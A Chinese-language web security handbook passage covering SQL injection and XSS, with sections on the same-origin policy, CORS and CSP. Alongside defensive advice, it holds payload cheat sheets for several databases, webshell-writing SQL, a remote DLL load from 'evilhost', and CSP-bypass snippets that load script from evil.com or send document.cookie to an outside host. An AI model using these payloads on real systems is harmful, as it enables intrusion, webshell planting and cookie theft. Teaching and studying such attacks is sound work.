SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。

#### 按技巧分类

根据使用的技巧，SQL 注入类型可分为

-   ##### 盲注

    -   布尔盲注：只能从应用返回中推断语句执行后的布尔值

    -   时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断

-   报错注入：应用会显示全部或者部分的报错信息

-   堆叠注入：有的应用可以加入 ; 后一次执行多条语句

-   其他

#### 按获取数据的方式分类

另外也可以根据获取数据的方式分为 3 类

##### inband

利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。

##### inference

通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注，通过 web 应用的其他改变来推断数据。

##### out of band (OOB)

通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。

### 4.1.2  注入检测

#### 常见的注入点

-   GET/POST/PUT/DELETE 参数

-   X-Forwarded-For

-   文件名

#### Fuzz注入点

-   \' / \"
-   1/1
-   1/0
-   and 1=1
-   \" and \"1\"=\"1
-   and 1=2
-   or 1=1
-   or 1=
-   \' and \'1\'=\'1
-   - \^ \* % /

-   \<\< \>\> \|\| \| & &&

-   \~

-   !

-   @

-   反引号执行

#### 测试用常量

-   @@version

-   @@servername

-   @@language

-   @@spid

#### 测试列数

例如 [http://www.foo.com/index.asp?id=12+union+select+null,null\--](http://www.foo.com/index.asp?id=12%2Bunion%2Bselect%2Bnull%2Cnull--) ，不断增加 null 至不返回

#### 报错注入

-   select 1/0

-   select 1 from (select count(\*),concat(version(),floor(rand(0)\*2))x from information_schema.tables group by x)a

-   extractvalue(1, concat(0x5c,(select user())))

-   updatexml(0x3a,concat(1,(select user())),1)

-   exp(\~(SELECT \* from(select user())a))

-   ST_LatFromGeoHash((select \* from(select \* from(select user())a)b))

-   GTID_SUBSET(version(), 1)

#### 基于geometric的报错注入

-   GeometryCollection((select \* from (select \* from(select user())a)b))

-   polygon((select \* from(select \* from(select user())a)b))

-   multipoint((select \* from(select \* from(select user())a)b))

-   multilinestring((select \* from(select \* from(select user())a)b))

-   LINESTRING((select \* from(select \* from(select user())a)b))

-   multipolygon((select \* from(select \* from(select user())a)b))

其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考[commit 95825f](https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04) 。而以上列表中基于 geometric 的报错注入在这个 [commit 5caea4](https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978) 中被修复，在 5.5.x 较后的版本中同样不再生效。

#### 堆叠注入

-   ;select 1

#### 注释符

-   \#

-   \--+

-   /\*xxx\*/

-   /\*!xxx\*/

-   /\*!50000xxx\*/

#### 判断过滤规则

-   是否有 trunc

-   是否过滤某个字符

-   是否过滤关键字

-   slash 和编码

#### 获取信息

-   **判断数据库类型**

    -   and exists (select \* from msysobjects ) \> 0 access 数据库

    -   and exists (select \* from sysobjects ) \> 0 SQLServer 数据库

-   ##### 判断数据库表

    -   and exsits (select \* from admin)

-   ###### 版本、主机名、用户名、库名

-   ##### 表和字段

    -   **确定字段数**
    -   Order By
        
    -   Select Into
    
-   表名、列名

#### 测试权限

-   **文件操作**

    -   读敏感文件

    -   写 shell

-   ##### 带外通道

    -   网络请求

### 4.1.3  权限提升

#### UDF提权

UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为MySQL 添加新函数，扩充其功能。

当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。

### 4.1.4  数据库检测

#### MySQL

-   sleep sleep(1)

-   benchmark BENCHMARK(5000000, MD5(\'test\'))

-   ##### 字符串连接

    -   SELECT \'a\' \'b\'

    -   SELECT CONCAT(\'some\',\'string\')

-   ##### version

    -   SELECT @@version

    -   SELECT version()

-   ##### 识别用函数

    -   connection_id()

    -   last_insert_id()

    -   row_count()

#### Oracle

- ##### 字符串连接

  - ##### 'a\'\|\|\'oracle\' \--

  - ##### SELECT CONCAT(\'some\',\'string\')

-   ##### version

    -   SELECT banner FROM v\$version

    -   SELECT banner FROM v\$version WHERE rownum=1

#### SQLServer

-   WAITFOR WAITFOR DELAY \'00:00:10\';

-   SERVERNAME SELECT @@SERVERNAME

-   version SELECT @@version

-   ##### 字符串连接

    -   SELECT \'some\'+\'string\'

-   ##### 常量

    -   @@pack_received

    -   @@rowcount

#### PostgreSQL

-   sleep pg_sleep(1)

### 4.1.5  绕过技巧

-   ##### 编码绕过

    -   大小写

    -   url编码

    -   html编码

    -   十六进制编码

- ##### 注释

  - unicode编码
  - // \-- \-- + \-- - \# /\*\*/ ;%00
  - 内联注释用的更多，它有一个特性 /!\*\*/ 只有 MySQL 能识别
  - e.g. index.php?id=-1 /\*!UNION\*/ /\*!SELECT\*/ 1,2,3

-   ##### 只过滤了一次时

    -   union=\> ununionion

-   ##### 相同功能替换

    -   ##### 函数替换

        -   substring / mid / sub

        -   ascii / hex / bin

        -   benchmark / sleep

    -   ##### 变量替换

        -   user() / @@user

    -   ##### 符号和关键字

        -   and / &

        -   or / \|

-   ##### HTTP参数

    -   ##### HTTP数污染

        -   id=1&id=2&id=3 根据容器不同会有不同的结果

    -   HTTP分割注入

-   ##### 缓冲区溢出

    -   一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理

- ##### 二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过

### 4.1.6  SQL注入小技巧

#### 宽字节注入

- 一般程序员用 gbk 编码做开发的时候，会用 set names \'gbk\' 来设定，这句话等同于

```sql
set
character_set_connection = 'gbk',
character_set_result = 'gbk',
character_set_client = 'gbk';
```

- 漏洞发生的原因是执行了 set character_set_client = \'gbk\'; 之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用 set names \'gbk\' 的话 real_escape 是不知道设置的数据的编码的，就会加 %5c 。此时 server 拿到数据解码就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。

- 解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是 mysql_set_charset(\'gbk\') ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。第三种就是用 pdo。

- 还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。

### 4.1.7  CheatSheet

#### SQL Server Payload

##### 常见Payload

-   ##### Version

    -   SELECT @@version

    -   SELECT SERVERPROPERTY(\'Edition\');

    -   SELECT SERVERPROPERTY(\'EngineEdition\');

-   ##### Comment

    -   SELECT 1 \-- comment

    -   SELECT /\*comment\*/1

- ##### Space

  - ##### 0x01 - 0x20

-   ##### 用户信息

    -   SELECT user_name()

    -   SELECT system_user

    -   SELECT user

    -   SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID

-   ##### 用户权限

    -   select IS_SRVROLEMEMBER(\'sysadmin\')

    -   select IS_SRVROLEMEMBER(\'db_owner\')

-   ##### List User

    -   SELECT name FROM master..syslogins

-   ##### 数据库信息

    -   SELECT name FROM master..sysdatabases

    -   select concat_ws(table_schema,table_name,column_name) from information_schema.columns

    -   select quotename(name) from master..sysdatabases FOR XML PATH(\'\')

-   ##### 执行命令

    -   EXEC xp_cmdshell \'net user\'

- ##### Ascii

  -   SELECT char(0x41)

  -   SELECT ascii(\'A\')

  -   SELECT char(65)+char(66) =\> return AB

- **Delay**

  - WAITFOR DELAY \'0:0:3\' pause for 3 seconds

-   ##### Change Password

    -   ALTER LOGIN \[sa\] WITH PASSWORD=N\'NewPassword\'

-   ##### Trick

    -   id=1 union:select password from:user

-   ##### 文件读取

    -   OpenRowset

-   ##### 当前查询语句

    -   select text from sys.dm_exec_requests cross apply sys. dm_exec_sql_text(sql_handle)

-   ##### hostname

    -   用于判断是否站库分离

    -   select host_name()

    -   exec xp_getnetname

-   ##### 服务器信息

    -   exec xp_msver

-   ##### 系统配置

    -   select \* from sys.configurations;

##### 注册表读写

-   **xp_regread**
    -   exec xp_regread N\'HKEY_LOCAL_MACHINE\', N\'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH\'
    
-   xp_regwrite

-   xp_regdeletvalue

-   xp_regdeletkey

-   xp_regaddmultistring

##### 报错注入

-   1=convert(int,(db_name()))

##### 常用函数

-   SUSER_NAME()

-   USER_NAME()

-   PERMISSIONS()

-   DB_NAME()

-   FILE_NAME()

-   TYPE_NAME()

-   COL_NAME()

##### DNS OOB

-   fn_xe_file_target_read_file

-   fn_get_audit_file

-   fn_trace_gettable

##### 其他常用存储过程

-   sp_execute_external_script

-   sp_makewebtask

-   sp_OACreate

-   sp_OADestroy

-   sp_OAGetErrorInfo

-   sp_OAGetProperty

-   sp_OAMethod

-   sp_OASetProperty

-   sp_OAStop

-   xp_cmdshell

-   xp_dirtree

-   xp_enumerrorlogs

-   xp_enumgroups

-   xp_fixeddrives

-   xp_getfiledetails

-   xp_loginconfig

#### MySQL Payload

##### 常见Payload

-   **Version**

    -   SELECT @@version

-   ##### Comment

    -   SELECT 1 \-- comment

    -   SELECT 1 \# comment

    -   SELECT /\*comment\*/1

- ##### Space

  - 0x9 0xa-0xd 0x20 0xa0

-   ##### Current User

    -   SELECT user()

    -   SELECT system_user()

    -   SELECT current_role()

-   ##### List User

    -   SELECT user FROM mysql.user

-   ##### Current Database

    -   SELECT database()

-   ##### List Database

    -   SELECT schema_name FROM information_schema.schemata

-   ##### List Tables

    -   SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != \'mysql\' AND table_schema != \'information_schema\'

-   ##### List Columns

    -   SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != \'mysql\' AND table_schema != \'information_schema\'

- ##### **If**

  - SELECT if(1=1,\'foo\',\'bar\'); return 'foo'

- **Ascii**

  - SELECT char(0x41)
  - SELECT ascii(\'A\')

  - SELECT 0x414243 =\> return ABC

- **Delay**

  - sleep(1)
  - SELECT BENCHMARK(1000000,MD5(\'A\'))

-   ##### Read File

    -   select @@datadir

    -   select load_file(\'databasename/tablename.MYD\')

-   ##### Blind

    -   ascii(substring(str,pos,length)) & 32 = 1

-   ##### Error Based

    -   select count(\*),(floor(rand(0)\*2))x from information_schema.tables group by x;

    -   select count(\*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1), floor(rand(0)\*2))

-   ##### Change Password

    -   mysql -uroot -e \"use mysql;UPDATE user SET password=PASSWORD(\'newpassword\') WHERE user=\'root\';FLUSH PRIVILEGES;\"

##### 报错注入常见函数

-   extractvalue

-   updatexml

-   GeometryCollection

-   linestring

-   multilinestring

-   multipoint

-   multipolygon

-   polygon

-   exp

#### 写文件

##### 写文件前提

-   root 权限

-   知晓文件绝对路径

-   写入的路径存在写入权限

-   secure_file_priv 允许向对应位置写入

-   select count(file_priv) from mysql.user

##### 基于into写文件

```sql
union select 1,1,1 into outfile '/tmp/demo.txt'
union select 1,1,1 into dumpfile '/tmp/demo.txt'
```

dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏

##### 基于log写文件

```sql
show variables like '%general%';
set global general_log = on;
set global general_log_file = '/path/to/file';
select '<?php var_dump("test");?>';
set global general_log_file = '/original/path';
set global general_log = off;
```

#### PostgresSQL Payload

-   **Version**

    -   SELECT version()

-   ##### Comment

    -   SELECT 1 \-- comment

    -   SELECT /\*comment\*/1

-   ##### Current User

    -   SELECT user

    -   SELECT current_user

    -   SELECT session_user

    -   SELECT getpgusername()

-   ##### List User

    -   SELECT usename FROM pg_user

-   ##### Current Database

    -   SELECT current_database()

-   ##### List Database

    -   SELECT datname FROM pg_database

- ##### Ascii

  - SELECT char(0x41)
  - SELECT ascii(\'A\')

- ##### **Delay**

  - ##### pg_sleep(1)

#### Oracle Payload

##### 常见Payload

- ##### dump

  - select \* from v\$tablespace;
  - select \* from user_tables;

  - select column_name from user_tab_columns where table_name = \'table_name\';

  - select column_name, data_type from user_tab_columns where table_name = \'table_name\';

  - SELECT \* FROM ALL_TABLES

- ##### Comment

  - ##### -- –

  - ##### /\*\*/

- ##### Space

  - 0x00 0x09 0xa-0xd 0x20

- ##### **报错**

  - utl_inaddr.get_host_name
  - ctxsys.drithsx.sn

  - ctxsys.CTX_REPORT.TOKEN_TYPE

  - XMLType

  - dbms_xdb_version.checkin

  - dbms_xdb_version.makeversioned

  - dbms_xdb_version.uncheckout

  - dbms_utility.sqlid_to_sqlhash

  - ordsys.ord_dicom.getmappingxpath

  - utl_inaddr.get_host_name

- ##### OOB

  - utl_inaddr.get_host_address
  - utl_http.request

  - utl_inaddr.get_host_address

  - SYS.DBMS_LDAP.INIT

  - HTTPURITYPE

  - HTTP_URITYPE.GETCLOB

- **绕过**

  - rawtohex

##### 写文件

```sql
create or replace directory TEST_DIR as '/path/to/dir';
grant read, write on directory TEST_DIR to system;
declare
isto_file utl_file.file_type;
begin
isto_file := utl_file.fopen('TEST_DIR', 'test.jsp', 'W');
utl_file.put_line(isto_file, '<% out.println("test"); %>');
utl_file.fflush(isto_file);
utl_file.fclose(isto_file);
end;
```

#### SQLite3 Payload

- ##### Comment（注释）

  -  \--
  - /\*\*/

-   ##### Version

    -   select sqlite_version();

Command Execution

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--
```

Load_extension

UNION SELECT 1,load_extension(\'\\\\evilhost\\evil.dll\',\'E\');\--

#### NoSQL Payload

##### 常见Payload

-   ##### 绕过限制条件

    -   {\"username\": \"user\"} =\> {\"username\": {\"ne\": \"fakeuser\"}}

    -   {\"\$where\": \"return true\"}

- ##### 测试用字符

  - ##### ' \" \\ / \$ \[ \] . \>

- ##### 布尔测试常用

  - {\"\$ne\": -1}
  - {\"\$in\": \[\]}
  - {\"\$where\": \"return true\"}
  - {\"\$or\": \[{},{\"foo\":\"1\"}\]}

- ##### 时间

  - {\"\$where\": \"sleep(100)\"}

### 4.1.8  预编译

#### 简介

SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。

#### 模拟预编译

为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。

#### 绕过

#### 预编译使用错误

预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。

#### 部分参数不可预编译

在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。

#### 预编译实现错误

部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。

### 4.1.9  参考文章

#### Tricks

-   [sqlmap time based inject 分析](http://blog.wils0n.cn/archives/178/)

-   [SQLInjectionWiki](https://github.com/NetSPI/SQLInjectionWiki)

-   [常见数据库写入 Webshell 汇总](https://mp.weixin.qq.com/s/BucCNyCmyATdRENZp0AF2A)

-   [MSSQL 数据库攻击实战指北](https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg)

#### Bypass

-   [SQL 注入 ByPass 的一些小技巧](https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg)

-   [Waf Bypass 之道](https://xz.aliyun.com/t/368)

-   [MySQL Bypass Wiki](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)

#### NoSQL

-   [NoSQL 注入的分析和缓解](http://www.yunweipai.com/archives/14084.html)

-   [NoSQL 注入](https://mp.weixin.qq.com/s/tG874LNTIdiN7MPtO-hovA)



## 4.2  XSS

### 4.2.1  分类

#### 简介

XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。

#### 反射型XSS

反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：\<?php echo \"\<p\>hello, \$\_GET\[\'user\'\]\</p\>\";?\> ，那么在访问时设置 /?user=\</p\>\<script\>alert(\"hack\")\</ script\>\<p\> ，则可执行预设好的 JavaScript 代码。

反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发， 受到 XSS Auditor、No-Script 等防御手段的影响较大。

#### 储存型XSS

储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。

#### DOM XSS

DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。

> 例如：
>
> ```html
><html>
> <head>
> <title>DOM Based XSS Demo</title>
> <script>
> function xsstest()
> {
> var str = document.getElementById("input").value;
> document.getElementById("output").innerHTML = "<img src='"+str+"'></img>";
> }
> </script>
> </head>
> <body>
> <div id="output"></div>
> <input type="text" id="input" size=50 value="" />
> <input type="button" value="submit" onclick="xsstest()" />
> </body>
> </html>
> ```

> ###### 输入 x\' onerror=\'javascript:alert(/xss/) 即可触发。

#### Blind XSS

Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个"受害者"访问这个页面时执行，并 在文档对象模型 (DOM) 中呈现 payload。它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。2

### 4.2.2  危害

存在 XSS 漏洞时，可能会导致以下几种情况：

1.  用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。
2.  攻击者能够在一定限度内记录用户的键盘输入。
3.  攻击者通过 CSRF 等方式以用户身份执行危险操作。
4.  XSS 蠕虫。
5.  获取用户浏览器信息。
6.  利用 XSS 漏洞扫描用户内网。


### 4.2.3  同源策略

#### 简介

同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。是否同源由 URL

决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。

#### file域的同源策略

在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。

从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。

#### cookie的同源策略

cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。

不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置cookie时，可以使用domain / path / secure 和 http-only 标记来限定其访问性。

所以https://localhost:8080/ 和 http://localhost:8081/ 的Cookie是共享的。

#### Flash/SilverLight跨域

浏览器的各种插件也存在跨域需求。通常是通过在服务器配置crossdomain.xml，设置本服务允许哪些域名的跨域访问。

客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。

#### 源的更改

同源策略认为域和子域属于不同的域，例如 child1.a.com 与 a.com / child1.a.com 与 child2.a.com /xxx.child1.a.com 与 child1.a.com 两两不同源。

对于这种情况，可以在两个方面各自设置 document.domain=\'a.com\' 来改变其源来实现以上任意两个页面之间的通信。

另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 null 。

#### 跨源访问

##### 同源策略控制了不同源之间的交互，这些交互通常分为三类：

1. ##### 通常允许跨域写操作 (Cross-origin writes)

   -   链接 (links)

   -   重定向

   -   表单提交

2. 通常允许跨域资源嵌入 (Cross-origin embedding)

3. 通常不允许跨域读操作 (Cross-origin reads)

##### 可能嵌入跨源的资源的一些示例有：

-   \<script src=\"\...\"\>\</script\> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。

-   \<link rel=\"stylesheet\" href=\"\...\"\> 标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。

-   \<img\> / \<video\> / \<audio\> 嵌入多媒体资源。

-   \<object\> \<embed\> 和 \<applet\> 的插件。

-   \@font-face 引入的字体。一些浏览器允许跨域字体 ( cross-origin fonts)，一些需要同源字体 (same- origin fonts)。

-   \<frame\> 和 \<iframe\> 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。

#### JSONP跨域

JSONP就是利用 \<script\> 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。

服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。

JSONP也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。

另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。

#### 跨源脚本API访问

Javascript 的 APIs 中，如 iframe.contentWindow , window.parent, window.open 和 window.opener 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 window 和 location 对象的访问添加限制。

window 允许跨源访问的方法有：

-   window.blur

-   window.close

-   window.focus

-   window.postMessage

window 允许跨源访问的属性有：

-   window.closed

-   window.frames

-   window.length

-   window.location

-   window.opener

-   window.parent

-   window.self

-   window.top

-   window.window

`其中window.location 允许读/写，其他的属性只允许读。`

#### 跨源数据存储访问

存储在浏览器中的数据，如 localStorage 和 IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。

#### CORS

CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。

#### 常见请求头

-   **Origin**

    -   预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段

    -   Origin: \<origin\>

-   #### Access-Control-Request-Method

    -   声明请求使用的方法

    -   Access-Control-Request-Method: \<method\>

-   #### Access-Control-Request-Headers

    -   声明请求使用的 header 字段

    -   Access-Control-Request-Headers: \<field-name\>\[, \<field-name\>\]\*

#### 常见返回头

-   **Access-Control-Allow-Origin**

    -   声明允许访问的源外域URI

    -   对于携带身份凭证的请求不可使用通配符 \*

    -   Access-Control-Allow-Origin: \<origin\> \| \*

-   #### Access-Control-Expose-Headers

    -   声明允许暴露的头

    -   e.g. Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header

-   #### Access-Control-Max-Age

    -   声明 Cache 时间

    -   Access-Control-Max-Age: \<delta-seconds\>

-   #### Access-Control-Allow-Credentials

    -   声明是否允许在请求中带入

    -   Access-Control-Allow-Credentials: true

-   #### Access-Control-Allow-Methods

    -   声明允许的访问方式

    -   Access-Control-Allow-Methods: \<method\>\[, \<method\>\]\*

-   #### Access-Control-Allow-Headers

    -   声明允许的头

    -   Access-Control-Allow-Headers: \<field-name\>\[, \<field-name\>\]\*

#### 防御建议

-   如非必要不开启 CORS

-   定义详细的白名单，不使用通配符，仅配置所需要的头

-   配置 Vary: Origin 头部

-   如非必要不使用 Access-Control-Allow-Credentials

-   限制缓存的时间

#### 阻止跨源访问

> 阻止跨域写操作，可以检测请求中的 CSRF token ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。
>
> 阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 Content-Type 消息头。例如如果在 HTML 文档中指定 \<script\> 标记，则浏览器会尝试将 HTML 解析为 JavaScript。

### 4.2.4  CSP

#### CSP是什么？

> Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。

#### 配置

> CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。
>
> CSP 有三类：

-   Content-Security-Policy (Google Chrome)
-   X-Content-Security-Policy (Firefox)
-   X-WebKit-CSP (WebKit-based browsers, e.g. Safari)

```http
HTTP header :
"Content-Security-Policy:" 策略
"Content-Security-Policy-Report-Only:" 策略
```

> HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report- Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。
>
> HTML Meta :
>
> ```html
> <meta http-equiv="content-security-policy" content="策略">
> <meta http-equiv="content-security-policy-report-only" content="策略">
> ```

#### 指令说明

-------------------------------------------------------------------------
  指令          说明
------------- -----------------------------------------------------------
  default-src   定义资源默认加载策略

  connect-src   定义 Ajax、WebSocket 等加载策略

  font-src      定义 Font 加载策略

  frame-src     定义 Frame 加载策略

  img-src       定义图片加载策略

  media-src     定义 \<audio\>、\<video\> 等引用资源加载策略

  object-src    定义 \<applet\>、\<embed\>、\<object\> 等引用资源加载策略

  script-src    定义 JS 加载策略

  style-src     定义 CSS 加载策略

  base-uri      定义 \<base\> 根 URL 策略，不使用 default-src 作为默认值

  sandbox       值为 allow-forms，对资源启用 sandbox

  report-uri    值为 /report-uri，提交日志

#### 关键字

-   **-**
    - 允许从任意 url 加载，除了 data: blob: filesystem: schemes
    - e.g. img-src -
-   **none**
    - 禁止从任何 url 加载资源
    - e.g. object-src \'none\'
-   **self**
    - 只可以加载同源资源
    - e.g. img-src \'self\'
-   **data:**
    - 可以通过 data 协议加载资源
    - e.g. img-src \'self\' data:

-   #### domain.example.com

    -   e.g. img-src domain.example.com

    -   只可以从特定的域加载资源

-   #### \\\*.example.com

    -   e.g. img-src \\\*.example.com

    -   可以从任意 example.com 的子域处加载资源

-   ##### https://cdn.com

    -   e.g. img-src https://cdn.com

    -   只能从给定的域用 https 加载资源

-   #### https:

    -   e.g. img-src https:

    -   只能从任意域用 https 加载资源

-   #### unsafe-inline

    -   允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签

    -   e.g. script-src \'unsafe-inline\'

-   #### unsafe-eval

    -   允许一些不安全的代码执行方式，例如js的eval()

    -   e.g. script-src \'unsafe-eval\'

-   #### nonce-\<base64-value\>\'

    -   使用随机的nonce，允许加载标签上nonce属性匹配的标签

    -   e.g. script-src \'nonce-bm9uY2U=\'

-   #### \<hash-algo\>-\<base64-value\>\'

    -   允许hash值匹配的代码块被执行

    -   e.g. script-src \'sha256-\<base64-value\>\'

#### 配置范例

> 允许执行内联 JS 代码，但不允许加载外部资源
>
> ```javascript
> Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
> ```

#### Bypass

##### 预加载

> 浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。
>
> HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如
>
> ```html
> <!-- 预加载某个页面 -->
> <link rel='prefetch' href='http://xxxx'><!-- firefox -->
> <link rel='prerender' href='http://xxxx'><!-- chrome -->
> <!-- 预加载某个图片 -->
> <link rel='prefetch' href='http://xxxx/x.jpg'>
> <!-- DNS 预解析 -->
> <link rel="dns-prefetch" href="http://xxxx">
> <!-- 特定文件类型预加载 -->
> <link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->
> ```

另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：

-   URL 中包含下载资源
-   页面中包含音频、视频
-   POST、PUT 和 DELET 操作的 ajax 请求
-   HTTP 认证
-   HTTPS 页面
-   含恶意软件的页面
-   弹窗页面
-   占用资源很多的页面
-   打开了 chrome developer tools 开发工具

#### MIME Sniff

> 举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 ''\<script href='[http:](http://xxx.com/xx.jpg%27)[//xxx.com/xx.jpg'](http://xxx.com/xx.jpg%27)\>''，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本
>

#### 302跳转

对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：

-   跳板必须在允许的域内。

-   要加载的文件的 host 部分必须跟允许的域的 host 部分一致

#### iframe

> 当可以执行代码时，可以创建一个源为 css js 等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用 ../../../ /%2e%2e%2f 等可能触发服务器报错的链接也可以到达相应的目的。

#### base-uri

> 当 script-src 为 nonce 或无限制， base-uri 无限制时，可通过 base 标签修改根 URL 来 bypass，如下加载了 <http://evil.com/main.js>
>
> ```html
> <base href="http://evil.com/">
> <script nonce="correct value" src="/main.js"></script>
> ```

#### 其他

-   location 绕过

-   可上传 SVG 时，通过恶意 SVG 绕过同源站点

-   存在 CRLF 漏洞 可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析

-   CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass

-   Angular versions \<1.5.9 \>=1.5.0，存在漏洞 [Git Pull Request](https://github.com/angular/angular.js/pull/15346)

- ##### jQuery sourcemap

  - ```javascript
    document.write(`<script>
    //@ sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);``
    ```

-   a 标签的ping属性

